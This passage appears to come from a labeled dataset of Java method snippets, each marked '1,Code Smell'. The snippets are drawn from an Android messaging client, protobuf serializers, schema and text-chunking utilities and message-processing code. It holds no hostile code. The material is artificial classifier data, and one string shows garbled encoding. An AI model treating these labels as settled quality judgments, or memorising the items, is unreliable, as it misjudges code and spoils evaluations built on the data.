    String newKey=""ALL_OF"";
    Map<String,Object> finalMap=new HashMap<>();
    boolean innerAllOff=values.values().stream().filter(Map.class::isInstance).count() == values.size();
    for (    Map.Entry<String,Object> entry : values.entrySet()) {
      Object value=entry.getValue();
      if (value instanceof Map) {
        finalMap.putAll(map);
      }
    }
    if (innerAllOff) {
      values.clear();
      values.put(newKey,finalMap);
    }
 else {
      values.put(propertyName,finalMap);
    }
    values=values.entrySet().stream().filter(entry -> entry.getValue() != null).collect(Collectors.toMap(Map.Entry::getKey,Map.Entry::getValue));
    this.createMergedSchema(propertyName,composedSchema.getAllOf());
  }
  List<Schema> anyOfNonNullSchemas=this.excludeNullSchemas(composedSchema.getAnyOf());
  if (anyOfNonNullSchemas.size() == 1) {
    values.put(propertyName,resolveModelToExample(propertyName,anyOfNonNullSchemas.get(0)));
  }
 else   if (composedSchema.getAnyOf() != null) {
    mapDiscriminator(composedSchema,anyOfNonNullSchemas);
    addXXXOfExamples(values,propertyName,anyOfNonNullSchemas,""ANY_OF"");
  }
  List<Schema> oneOfNonNullSchemas=this.excludeNullSchemas(composedSchema.getOneOf());
  if (oneOfNonNullSchemas.size() == 1) {
    values.put(propertyName,resolveModelToExample(propertyName,oneOfNonNullSchemas.get(0)));
  }
 else   if (composedSchema.getOneOf() != null) {
    mapDiscriminator(composedSchema,oneOfNonNullSchemas);
    addXXXOfExamples(values,propertyName,oneOfNonNullSchemas,""ONE_OF"");
  }
}",1,Code Smell
"@Override public boolean onDoubleTap(MotionEvent e){
  if ((videoPlayer != null || photoViewerWebView != null && photoViewerWebView.isControllable()) && videoPlayerControlVisible) {
    long current=getCurrentVideoPosition();
    long total=getVideoDuration();
    float x=e.getX();
    int width=getContainerViewWidth();
    boolean forward=x >= width / 3 * 2;
    if (canDoubleTapSeekVideo(e)) {
      long old=current;
      if (x >= width / 3 * 2) {
        current+=10000;
      }
 else       if (x < width / 3) {
        current-=10000;
      }
      if (old != current) {
        boolean apply=true;
        if (current > total) {
          current=total;
        }
 else         if (current < 0) {
          if (current < -9000) {
            apply=false;
          }
          current=0;
        }
        if (apply) {
          videoForwardDrawable.setOneShootAnimation(true);
          videoForwardDrawable.setLeftSide(x < width / 3);
          videoForwardDrawable.addTime(10000);
          seekVideoOrWebTo(current);
          containerView.invalidate();
          videoPlayerSeekbar.setProgress(current / (float)total,true);
          videoPlayerSeekbarView.invalidate();
        }
        return true;
      }
    }
  }
  if (!canZoom || scale == 1.0f && (translationY != 0 || translationX != 0)) {
    return false;
  }
  if (animationStartTime != 0 || animationInProgress != 0) {
    return false;
  }
  if (photoProgressViews[0] != null && photoProgressViews[0].isVisible() && photoProgressViews[0].backgroundState != PROGRESS_NONE && Math.sqrt(Math.pow(AndroidUtilities.displaySize.x / 2f - e.getX(),2) + Math.pow((AndroidUtilities.displaySize.y + AndroidUtilities.statusBarHeight) / 2f - e.getY(),2)) < dp(40)) {
    return false;
  }
  if (scale == 1.0f) {
    float atx=(e.getX() - getContainerViewWidth() / 2) - ((e.getX() - getContainerViewWidth() / 2) - translationX) * (3.0f / scale);
    float aty=(e.getY() - getContainerViewHeight() / 2) - ((e.getY() - getContainerViewHeight() / 2) - translationY) * (3.0f / scale);
    updateMinMax(3.0f);
    if (atx < minX) {
      atx=minX;
    }
 else     if (atx > maxX) {
      atx=maxX;
    }
    if (aty < minY) {
      aty=minY;
    }
 else     if (aty > maxY) {
      aty=maxY;
    }
    animateTo(3.0f,atx,aty,true);
  }
 else {
    animateTo(1.0f,0,0,true);
  }
  doubleTap=true;
  hidePressedDrawables();
  return true;
}",1,Code Smell
"int getSubPositionByView(View view,View childView){
  if (view == null || childView == null) {
    return 0;
  }
  final LayoutParams lp=(LayoutParams)view.getLayoutParams();
  final ItemAlignmentFacet facet=lp.getItemAlignmentFacet();
  if (facet != null) {
    final ItemAlignmentFacet.ItemAlignmentDef[] defs=facet.getAlignmentDefs();
    if (defs.length > 1) {
      while (childView != view) {
        int id=childView.getId();
        if (id != View.NO_ID) {
          for (int i=1; i < defs.length; i++) {
            if (defs[i].getItemAlignmentFocusViewId() == id) {
              return i;
            }
          }
        }
        childView=(View)childView.getParent();
      }
    }
  }
  return 0;
}",1,Code Smell
"private String substituteTypedPattern(String key,int index,TemplateParameterParser.TypedPatternContext typedPattern){
  Object parameter=parameters[index];
  String s;
  String matcherName=typedPattern.patternType().matcherName().Identifier().getText();
  TypeContext param=typedPattern.patternType().type();
  if (""anyArray"".equals(matcherName)) {
    if (!(parameter instanceof TypedTree)) {
      throw new IllegalArgumentException(""anyArray can only be used on TypedTree parameters"");
    }
    JavaType type=((TypedTree)parameter).getType();
    if (type == null && parameter instanceof J.Empty && ((J.Empty)parameter).getMarkers().findFirst(TemplateParameter.class).isPresent()) {
      type=((J.Empty)parameter).getMarkers().findFirst(TemplateParameter.class).get().getType();
    }
    JavaType.Array arrayType=TypeUtils.asArray(type);
    if (arrayType == null) {
      arrayType=TypeUtils.asArray(type);
      if (arrayType == null) {
        throw new IllegalArgumentException(""anyArray can only be used on parameters containing JavaType.Array type attribution"");
      }
    }
    int dimensions=1;
    for (; arrayType.getElemType() instanceof JavaType.Array; arrayType=(JavaType.Array)arrayType.getElemType()) {
      dimensions++;
    }
    s=""("" + newArrayParameter(arrayType.getElemType(),dimensions,index) + "")"";
  }
 else   if (""any"".equals(matcherName)) {
    JavaType type;
    if (param != null) {
      type=TypeParameter.toFullyQualifiedName(param);
    }
 else {
      if (parameter instanceof J.NewClass && ((J.NewClass)parameter).getBody() != null && ((J.NewClass)parameter).getClazz() != null) {
        type=((J.NewClass)parameter).getClazz().getType();
      }
 else       if (parameter instanceof TypedTree) {
        type=((TypedTree)parameter).getType();
      }
 else {
        type=null;
      }
    }
    String fqn=getTypeName(type);
    JavaType.Primitive primitive=JavaType.Primitive.fromKeyword(fqn);
    s=primitive == null || primitive.equals(JavaType.Primitive.String) ? newObjectParameter(fqn,index) : newPrimitiveParameter(fqn,index);
    parameters[index]=((J)parameter).withPrefix(Space.EMPTY);
  }
 else {
    throw new IllegalArgumentException(""Invalid template matcher '"" + key + ""'"");
  }
  return s;
}",1,Code Smell
"@java.lang.Override public int getSerializedSize(){
  int size=memoizedSize;
  if (size != -1)   return size;
  size=0;
  if (metadata_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(1,getMetadata());
  }
  if (converter_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(2,getConverter());
  }
  if (!model_.isEmpty()) {
    size+=com.google.protobuf.CodedOutputStream.computeBytesSize(3,model_);
  }
{
    int dataSize=0;
    for (int i=0; i < forwardFeatureMapping_.size(); i++) {
      dataSize+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(forwardFeatureMapping_.getInt(i));
    }
    size+=dataSize;
    if (!getForwardFeatureMappingList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    forwardFeatureMappingMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    for (int i=0; i < backwardFeatureMapping_.size(); i++) {
      dataSize+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(backwardFeatureMapping_.getInt(i));
    }
    size+=dataSize;
    if (!getBackwardFeatureMappingList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    backwardFeatureMappingMemoizedSerializedSize=dataSize;
  }
  size+=unknownFields.getSerializedSize();
  memoizedSize=size;
  return size;
}",1,Code Smell
"@java.lang.Override public int getSerializedSize(){
  int size=memoizedSize;
  if (size != -1)   return size;
  size=0;
  if (svmType_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(1,svmType_);
  }
  if (kernelType_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(2,kernelType_);
  }
  if (degree_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(3,degree_);
  }
  if (java.lang.Double.doubleToRawLongBits(gamma_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(4,gamma_);
  }
  if (java.lang.Double.doubleToRawLongBits(coef0_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(5,coef0_);
  }
  if (java.lang.Double.doubleToRawLongBits(cacheSize_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(6,cacheSize_);
  }
  if (java.lang.Double.doubleToRawLongBits(eps_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(7,eps_);
  }
  if (java.lang.Double.doubleToRawLongBits(c_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(8,c_);
  }
  if (nrWeight_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(9,nrWeight_);
  }
{
    int dataSize=0;
    for (int i=0; i < weightLabel_.size(); i++) {
      dataSize+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(weightLabel_.getInt(i));
    }
    size+=dataSize;
    if (!getWeightLabelList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    weightLabelMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    dataSize=8 * getWeightList().size();
    size+=dataSize;
    if (!getWeightList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    weightMemoizedSerializedSize=dataSize;
  }
  if (java.lang.Double.doubleToRawLongBits(nu_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(12,nu_);
  }
  if (java.lang.Double.doubleToRawLongBits(p_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(13,p_);
  }
  if (shrinking_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(14,shrinking_);
  }
  if (probability_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(15,probability_);
  }
  size+=unknownFields.getSerializedSize();
  memoizedSize=size;
  return size;
}",1,Code Smell
"private void invalidateBlur(){
  if (dimmingSliderContainer != null) {
    dimmingSliderContainer.invalidate();
  }
  if (backgroundButtonsContainer != null) {
    for (int a=0, N=backgroundButtonsContainer.getChildCount(); a < N; a++) {
      backgroundButtonsContainer.getChildAt(a).invalidate();
    }
  }
  if (messagesButtonsContainer != null) {
    for (int a=0, N=messagesButtonsContainer.getChildCount(); a < N; a++) {
      messagesButtonsContainer.getChildAt(a).invalidate();
    }
  }
  if (backgroundCheckBoxView != null) {
    for (int i=0; i < backgroundCheckBoxView.length; ++i) {
      if (backgroundCheckBoxView[i] != null) {
        backgroundCheckBoxView[i].setDimAmount(shouldShowBrightnessControll ? dimAmount * progressToDarkTheme : 0);
        backgroundCheckBoxView[i].invalidate();
      }
    }
  }
  if (listView != null) {
    for (int i=0; i < listView.getChildCount(); ++i) {
      View child=listView.getChildAt(i);
      if (child instanceof ChatActionCell) {
        setVisiblePart((ChatActionCell)child);
        child.invalidate();
      }
    }
  }
  if (listView2 != null) {
    for (int i=0; i < listView2.getChildCount(); ++i) {
      View child=listView2.getChildAt(i);
      if (child instanceof ChatActionCell) {
        setVisiblePart((ChatActionCell)child);
        child.invalidate();
      }
    }
  }
  if (applyButton1 != null) {
    applyButton1.invalidate();
  }
  if (applyButton2 != null) {
    applyButton2.invalidate();
  }
  if (bottomOverlayChat != null) {
    bottomOverlayChat.invalidate();
  }
}",1,Code Smell
"private List<String> executeSteps(String activityCode,List<String> stepCodes,Stack<IRevokableDomainStep> executedSteps,Model model,SchedulingTaskExecutor taskExecutor,Set<String> asyncStepCodes) throws RuntimeException {
  if (asyncStepCodes == null || taskExecutor == null) {
    asyncStepCodes=emptyAsyncSteps;
  }
  List<Step> steps=DDD.findSteps(activityCode,stepCodes);
  String currentStepCode=null;
  try {
    for (    Step step : steps) {
      currentStepCode=step.stepCode();
      beforeStep(step,model);
      if (asyncStepCodes.contains(currentStepCode)) {
        asyncExecuteStep(taskExecutor,step,model);
      }
 else {
        step.execute(model);
      }
      afterStep(step,model);
      if (step instanceof IRevokableDomainStep && !asyncStepCodes.contains(currentStepCode)) {
        executedSteps.push((IRevokableDomainStep)step);
      }
    }
  }
 catch (  Exception cause) {
    if (cause instanceof IReviseStepsException) {
      return ((IReviseStepsException)cause).subsequentSteps();
    }
    log.error(""Step:{}.{} fails for {}"",activityCode,currentStepCode,stepCodes,cause);
    if (cause instanceof RejectedExecutionException) {
      throw (RejectedExecutionException)cause;
    }
    if (!executedSteps.empty() && cause instanceof RuntimeException) {
      if (cause.getClass() == resolveStepExType()) {
        safeRollbackExecutedSteps(model,(RuntimeException)cause,executedSteps);
      }
 else {
        log.debug(""will not rollback, {} thrown"",cause.getClass().getCanonicalName());
      }
    }
    throw cause;
  }
  return emptyRevisedSteps;
}
",1,Code Smell
"@Override public int scrollVerticallyBy(int dy,RecyclerView.Recycler recycler,RecyclerView.State state){
  if (!NekoConfig.disableSwipeToNext.Bool() && dy < 0 && pullingDownOffset != 0) {
    pullingDownOffset+=dy;
    if (pullingDownOffset < 0) {
      dy=(int)pullingDownOffset;
      pullingDownOffset=0;
      chatListView.invalidate();
    }
 else {
      dy=0;
    }
  }
  int n=chatListView.getChildCount();
  int scrolled=0;
  boolean foundTopView=false;
  for (int i=0; i < n; i++) {
    View child=chatListView.getChildAt(i);
    float padding=chatListViewPaddingTop;
    if (isThreadChat() && (!isTopic || topicStarterMessageObject != null) && pinnedMessageView != null && pinnedMessageView.getVisibility() == View.VISIBLE) {
      padding-=Math.max(0,AndroidUtilities.dp(48) + pinnedMessageEnterOffset);
    }
    if (chatListView.getChildAdapterPosition(child) == chatAdapter.getItemCount() - 1) {
      int dyLocal=dy;
      if (child.getTop() - dy > padding) {
        dyLocal=(int)(child.getTop() - padding);
      }
      scrolled=super.scrollVerticallyBy(dyLocal,recycler,state);
      foundTopView=true;
      break;
    }
  }
  if (!foundTopView) {
    scrolled=super.scrollVerticallyBy(dy,recycler,state);
  }
  if (!NekoConfig.disableSwipeToNext.Bool() && dy > 0 && scrolled == 0 && ChatObject.isChannel(currentChat) && !currentChat.megagroup && chatListView.getScrollState() == RecyclerView.SCROLL_STATE_DRAGGING && !chatListView.isFastScrollAnimationRunning() && !chatListView.isMultiselect() && reportType < 0) {
    if (pullingDownOffset == 0 && pullingDownDrawable != null) {
      pullingDownDrawable.updateDialog();
    }
    if (pullingDownBackAnimator != null) {
      pullingDownBackAnimator.removeAllListeners();
      pullingDownBackAnimator.cancel();
    }
    float k;
    if (pullingDownOffset < AndroidUtilities.dp(110)) {
      float progress=pullingDownOffset / AndroidUtilities.dp(110);
      k=0.65f * (1f - progress) + 0.45f * progress;
    }
 else     if (pullingDownOffset < AndroidUtilities.dp(160)) {
      float progress=(pullingDownOffset - AndroidUtilities.dp(110)) / AndroidUtilities.dp(50);
      k=0.45f * (1f - progress) + 0.05f * progress;
    }
 else {
      k=0.05f;
    }
    pullingDownOffset+=dy * k;
    ReactionsEffectOverlay.onScrolled((int)(dy * k));
    chatListView.invalidate();
  }
  if (pullingDownOffset == 0) {
    chatListView.setOverScrollMode(View.OVER_SCROLL_ALWAYS);
  }
 else {
    chatListView.setOverScrollMode(View.OVER_SCROLL_NEVER);
  }
  if (pullingDownDrawable != null) {
    pullingDownDrawable.showBottomPanel(pullingDownOffset > 0 && chatListView.getScrollState() == RecyclerView.SCROLL_STATE_DRAGGING);
  }
  return scrolled;
}",1,Code Smell
"private static void toHTML_3_wrapMonoscape(StringBuilder out,Spanned text,int start,int end){
  int next;
  for (int i=start; i < end; i=next) {
    next=text.nextSpanTransition(i,end,URLSpanMono.class);
    if (next < 0) {
      next=end;
    }
    URLSpanMono[] spans=text.getSpans(i,next,URLSpanMono.class);
    if (spans != null) {
      for (int j=0; j < spans.length; ++j) {
        URLSpanMono span=spans[j];
        if (span != null) {
          out.append(""<pre>"");
        }
      }
    }
    toHTML_4_wrapMonoscape2(out,text,i,next);
    if (spans != null) {
      for (int j=0; j < spans.length; ++j) {
        URLSpanMono span=spans[j];
        if (span != null) {
          out.append(""</pre>"");
        }
      }
    }
  }
}",1,Code Smell
"public DevicePropertiesEntity withValue(PropertyMetadata metadata,Object value){
  if (metadata == null) {
    setValue(String.valueOf(value));
    if (value instanceof Number) {
      numberValue=new BigDecimal(value.toString());
    }
 else     if (value instanceof Date) {
      timeValue=((Date)value);
    }
    return this;
  }
  setProperty(metadata.getId());
  setPropertyName(metadata.getName());
  return withValue(metadata.getValueType(),value);
}
public DevicePropertiesEntity withValue(DataType type,Object value){
  if (value == null) {
    return this;
  }
  setType(type.getType());
  String convertedValue;
  if (type instanceof NumberType) {
    NumberType<?> numberType=(NumberType<?>)type;
    Number number=numberType.convertNumber(value);
    if (number == null) {
      throw new UnsupportedOperationException(""鏃犳硶灏�"" + value + ""杞负""+ type.getId());
    }
    convertedValue=number.toString();
    BigDecimal numberVal;
    if (number instanceof BigDecimal) {
      numberVal=((BigDecimal)number);
    }
 else     if (number instanceof Integer) {
      numberVal=BigDecimal.valueOf(number.intValue());
    }
 else     if (number instanceof Long) {
      numberVal=BigDecimal.valueOf(number.longValue());
    }
 else {
      numberVal=BigDecimal.valueOf(number.doubleValue());
    }
    setNumberValue(numberVal);
  }
 else   if (type instanceof DateTimeType) {
    DateTimeType dateTimeType=(DateTimeType)type;
    convertedValue=String.valueOf(value);
    setTimeValue(dateTimeType.convert(value));
  }
 else   if (type instanceof ObjectType) {
    ObjectType objectType=(ObjectType)type;
    Object val=objectType.convert(value);
    convertedValue=JSON.toJSONString(val);
    setObjectValue(val);
  }
 else   if (type instanceof ArrayType) {
    ArrayType objectType=(ArrayType)type;
    Object val=objectType.convert(value);
    convertedValue=JSON.toJSONString(val);
    setObjectValue(val);
  }
 else   if (type instanceof GeoType) {
    GeoType geoType=(GeoType)type;
    GeoPoint val=geoType.convert(value);
    convertedValue=String.valueOf(val);
    setGeoValue(val);
  }
 else {
    setStringValue(convertedValue=String.valueOf(value));
  }
  setValue(convertedValue);
  ofNullable(type.format(value)).map(String::valueOf).ifPresent(this::setFormatValue);
  return this;
}
",1,Code Smell
"/** 
 * Filter cached partition information
 * @param registerInfoMap     the partitions to register
 * @param unRegPartitionList  the unregistered partition list
 */
public void filterCachedPartitionInfo(Map<BrokerInfo,List<Partition>> registerInfoMap,List<Partition> unRegPartitionList){
  List<BrokerInfo> brokerInfoList=new ArrayList<>();
  for (  Map.Entry<BrokerInfo,List<Partition>> entry : registerInfoMap.entrySet()) {
    if (entry.getKey() == null || entry.getValue() == null) {
      continue;
    }
    ConcurrentLinkedQueue<Partition> partitionList=brokerPartitionConMap.get(entry.getKey());
    if (partitionList == null || partitionList.isEmpty()) {
      unRegPartitionList.addAll(entry.getValue());
    }
 else {
      boolean isNewBroker=true;
      for (      Partition regPartition : entry.getValue()) {
        if (!partitionList.contains(regPartition)) {
          unRegPartitionList.add(regPartition);
          isNewBroker=false;
        }
      }
      if (isNewBroker) {
        brokerInfoList.add(entry.getKey());
      }
    }
  }
  for (  BrokerInfo brokerInfo : brokerInfoList) {
    registerInfoMap.remove(brokerInfo);
  }
}
",1,Code Smell
"@java.lang.Override public int getSerializedSize(){
  int size=memoizedSize;
  if (size != -1)   return size;
  size=0;
  if (data_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(1,getData());
  }
  if (java.lang.Double.doubleToRawLongBits(baseRate_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(2,baseRate_);
  }
  if (java.lang.Double.doubleToRawLongBits(lambdaSqrt_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(3,lambdaSqrt_);
  }
  if (scaleShrinking_ != false) {
    size+=com.google.protobuf.CodedOutputStream.computeBoolSize(4,scaleShrinking_);
  }
  if (reproject_ != false) {
    size+=com.google.protobuf.CodedOutputStream.computeBoolSize(5,reproject_);
  }
  if (java.lang.Double.doubleToRawLongBits(squaredTwoNorm_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(6,squaredTwoNorm_);
  }
  if (iteration_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(7,iteration_);
  }
  if (java.lang.Double.doubleToRawLongBits(multiplier_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(8,multiplier_);
  }
  size+=unknownFields.getSerializedSize();
  memoizedSize=size;
  return size;
}",1,Code Smell
"protected List<String> doSplit(String text,int chunkSize){
  if (text == null || text.trim().isEmpty()) {
    return new ArrayList<>();
  }
  List<Integer> tokens=getEncodedTokens(text);
  List<String> chunks=new ArrayList<>();
  int num_chunks=0;
  while (!tokens.isEmpty() && num_chunks < this.maxNumChunks) {
    List<Integer> chunk=tokens.subList(0,Math.min(chunkSize,tokens.size()));
    String chunkText=decodeTokens(chunk);
    if (chunkText.trim().isEmpty()) {
      tokens=tokens.subList(chunk.size(),tokens.size());
      continue;
    }
    int lastPunctuation=Math.max(chunkText.lastIndexOf('.'),Math.max(chunkText.lastIndexOf('?'),Math.max(chunkText.lastIndexOf('!'),chunkText.lastIndexOf('\n'))));
    if (lastPunctuation != -1 && lastPunctuation > this.minChunkSizeChars) {
      chunkText=chunkText.substring(0,lastPunctuation + 1);
    }
    String chunkTextToAppend=(this.keepSeparator) ? chunkText.trim() : chunkText.replace(System.lineSeparator(),"" "").trim();
    if (chunkTextToAppend.length() > this.minChunkLengthToEmbed) {
      chunks.add(chunkTextToAppend);
    }
    tokens=tokens.subList(getEncodedTokens(chunkText).size(),tokens.size());
    num_chunks++;
  }
  if (!tokens.isEmpty()) {
    String remaining_text=decodeTokens(tokens).replace(System.lineSeparator(),"" "").trim();
    if (remaining_text.length() > this.minChunkLengthToEmbed) {
      chunks.add(remaining_text);
    }
  }
  return chunks;
}",1,Code Smell
"@SuppressLint(""NotifyDataSetChanged"") private void showColorList(boolean show){
  if (isColorListShown != show) {
    isColorListShown=show;
    if (toolsTransformAnimation != null) {
      toolsTransformAnimation.cancel();
    }
    toolsTransformAnimation=new SpringAnimation(new FloatValueHolder(show ? 0 : 1000f));
    toolsTransformAnimation.setSpring(new SpringForce().setFinalPosition(show ? 1000f : 0f).setStiffness(1250f).setDampingRatio(SpringForce.DAMPING_RATIO_NO_BOUNCY));
    boolean[] moveBottomLayout=new boolean[]{keyboardVisible || emojiViewVisible};
    float bottomLayoutTranslationY=bottomLayout.getTranslationY();
    View barView=getBarView();
    toolsTransformAnimation.addUpdateListener((animation,value,velocity) -> {
      toolsTransformProgress=value / 1000f;
      float scale=0.6f + 0.4f * (1f - toolsTransformProgress);
      barView.setScaleX(scale);
      barView.setScaleY(scale);
      barView.setTranslationY(dp(16) * Math.min(toolsTransformProgress,0.25f) / 0.25f);
      barView.setAlpha(1f - Math.min(toolsTransformProgress,0.25f) / 0.25f);
      colorsListView.setProgress(toolsTransformProgress,show);
      doneButton.setProgress(toolsTransformProgress);
      cancelButton.setProgress(toolsTransformProgress);
      tabsLayout.setTranslationY(dp(32) * toolsTransformProgress);
      if (moveBottomLayout[0]) {
        float progress=show ? toolsTransformProgress : 1f - toolsTransformProgress;
        bottomLayout.setTranslationY(bottomLayoutTranslationY - dp(40) * progress * (show ? 1 : -1));
      }
      bottomLayout.invalidate();
      if (barView == textOptionsView) {
        overlayLayout.invalidate();
      }
    }
);
    toolsTransformAnimation.addEndListener((animation,canceled,value,velocity) -> {
      if (animation == toolsTransformAnimation) {
        toolsTransformAnimation=null;
        if (!show) {
          colorsListView.setVisibility(GONE);
          PersistColorPalette.getInstance(currentAccount).saveColors();
          colorsListView.getAdapter().notifyDataSetChanged();
        }
      }
    }
);
    toolsTransformAnimation.start();
    if (show) {
      colorsListView.setVisibility(VISIBLE);
      colorsListView.setSelectedColorIndex(PersistColorPalette.getInstance(currentAccount).getCurrentColorPosition());
    }
  }
}",1,Code Smell
"private void putMediaDatabase(long uid,int topicId,int type,ArrayList<TLRPC.Message> messages,int max_id,int min_id,boolean topReached){
  getMessagesStorage().getStorageQueue().postRunnable(() -> {
    try {
      if (min_id == 0 && (messages.isEmpty() || topReached)) {
        getMessagesStorage().doneHolesInMedia(uid,max_id,type,topicId);
        if (messages.isEmpty()) {
          return;
        }
      }
      getMessagesStorage().getDatabase().beginTransaction();
      SQLitePreparedStatement state2;
      if (topicId != 0) {
        state2=getMessagesStorage().getDatabase().executeFast(""REPLACE INTO media_topics VALUES(?, ?, ?, ?, ?, ?)"");
      }
 else {
        state2=getMessagesStorage().getDatabase().executeFast(""REPLACE INTO media_v4 VALUES(?, ?, ?, ?, ?)"");
      }
      for (      TLRPC.Message message : messages) {
        if (canAddMessageToMedia(message)) {
          state2.requery();
          NativeByteBuffer data=new NativeByteBuffer(message.getObjectSize());
          message.serializeToStream(data);
          int pointer=1;
          state2.bindInteger(pointer++,message.id);
          state2.bindLong(pointer++,uid);
          if (topicId != 0) {
            state2.bindInteger(pointer++,topicId);
          }
          state2.bindInteger(pointer++,message.date);
          state2.bindInteger(pointer++,type);
          state2.bindByteBuffer(pointer++,data);
          state2.step();
          data.reuse();
        }
      }
      state2.dispose();
      if (!topReached || max_id != 0 || min_id != 0) {
        int minId=(topReached && min_id == 0) ? 1 : messages.get(messages.size() - 1).id;
        if (min_id != 0) {
          getMessagesStorage().closeHolesInMedia(uid,minId,messages.get(0).id,type,topicId);
        }
 else         if (max_id != 0) {
          getMessagesStorage().closeHolesInMedia(uid,minId,max_id,type,topicId);
        }
 else {
          getMessagesStorage().closeHolesInMedia(uid,minId,Integer.MAX_VALUE,type,topicId);
        }
      }
      getMessagesStorage().getDatabase().commitTransaction();
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
  }
);
}",1,Code Smell
"/** 
 * Add this handler to our set, creating containers as needs be.
 * @param handler The handler to add.
 */
private void addHandler(Object handler){
  if (handler == null)   return;
  boolean recognizedHandler=false;
  if (handler instanceof IVideoProducer) {
    addVideoProducer((IVideoProducer)handler);
    recognizedHandler=true;
  }
  if (handler instanceof IAudioProducer) {
    addAudioProducer((IAudioProducer)handler);
    recognizedHandler=true;
  }
  if (handler instanceof IPerformanceProducer) {
    addPerformanceProducer((IPerformanceProducer)handler);
    recognizedHandler=true;
  }
  if (handler instanceof ICommandHandler) {
    addCommandHandler((ICommandHandler)handler);
    recognizedHandler=true;
  }
  if (handler instanceof IObservationProducer) {
    addObservationProducer((IObservationProducer)handler);
    recognizedHandler=true;
  }
  if (handler instanceof IRewardProducer) {
    addRewardProducer((IRewardProducer)handler);
    recognizedHandler=true;
  }
  if (handler instanceof IWorldGenerator) {
    addWorldGenerator((IWorldGenerator)handler);
    recognizedHandler=true;
  }
  if (handler instanceof IWorldDecorator) {
    addWorldDecorator((IWorldDecorator)handler);
    recognizedHandler=true;
  }
  if (handler instanceof IWantToQuit) {
    addQuitProducer((IWantToQuit)handler);
    recognizedHandler=true;
  }
  if (!recognizedHandler) {
    this.failedHandlers+=handler.getClass().getSimpleName() + "" isn't of a recognised handler type.\n"";
  }
}
",1,Code Smell
"@Override @SuppressWarnings(""unchecked"") public void registerNodeGenerator(NodeContainer<TransitionNode> nodeContainer){
  for (  TransitionNode node : nodeContainer.getAllNodes()) {
    if (node instanceof AutoTaskNode) {
      registerGenerator(node,new AutoTaskGenerator(this,(AutoTaskNode)node));
    }
 else     if (node instanceof ScriptTaskNode) {
      registerGenerator(node,new ScriptTaskGenerator(this,(ScriptTaskNode)node));
    }
 else     if (node instanceof DecisionNode) {
      registerGenerator(node,new DecisionGenerator(this,(DecisionNode)node));
    }
 else     if (node instanceof StartNode) {
      registerGenerator(node,new StartGenerator(this,(StartNode)node));
    }
 else     if (node instanceof EndNode) {
      registerGenerator(node,new EndGenerator(this,(EndNode)node));
    }
 else     if (node instanceof LoopProcessNode) {
      registerGenerator(node,new LoopProcessGenerator(this,(LoopProcessNode)node));
    }
 else     if (node instanceof BreakNode) {
      registerGenerator(node,new BreakGenerator(this,(BreakNode)node));
    }
 else     if (node instanceof ContinueNode) {
      registerGenerator(node,new ContinueGenerator(this,(ContinueNode)node));
    }
 else     if (node instanceof SubBpmNode) {
      registerGenerator(node,new SubBpmGenerator(this,(SubBpmNode)node));
    }
 else     if (node instanceof NoteNode) {
      registerGenerator(node,new NoteGenerator(this,(NoteNode)node));
    }
 else     if (node instanceof WaitTaskNode) {
      registerGenerator(node,new WaitTaskGenerator(this,(WaitTaskNode)node));
    }
 else     if (node instanceof WaitEventTaskNode) {
      registerGenerator(node,new WaitEventTaskGenerator(this,(WaitEventTaskNode)node));
    }
 else {
      throw new IllegalStateException(""Unknown node type: "" + node.getClass().getName());
    }
    if (node instanceof NodeContainer) {
      registerNodeGenerator((NodeContainer)node);
    }
  }
}
",1,Code Smell
"private void processV0Msg(Channel channel,ByteBuf cb,AbsV0MsgCodec msgCodec) throws Exception {
  final StringBuilder strBuff=new StringBuilder(512);
  if (!msgCodec.descMsg(source,cb)) {
    responseV0Msg(channel,msgCodec,strBuff);
    return;
  }
  if (source.isRejectService()) {
    source.fileMetricIncSumStats(StatConstants.EVENT_SERVICE_CLOSED);
    msgCodec.setFailureInfo(DataProxyErrCode.SERVICE_CLOSED);
    responseV0Msg(channel,msgCodec,strBuff);
    return;
  }
  if (!ConfigManager.getInstance().isMqClusterReady()) {
    source.fileMetricIncSumStats(StatConstants.EVENT_SERVICE_SINK_UNREADY);
    msgCodec.setFailureInfo(DataProxyErrCode.SINK_SERVICE_UNREADY);
    responseV0Msg(channel,msgCodec,strBuff);
    return;
  }
  if (!msgCodec.validAndFillFields(source,strBuff)) {
    responseV0Msg(channel,msgCodec,strBuff);
    return;
  }
  Event event=msgCodec.encEventPackage(source,channel);
  try {
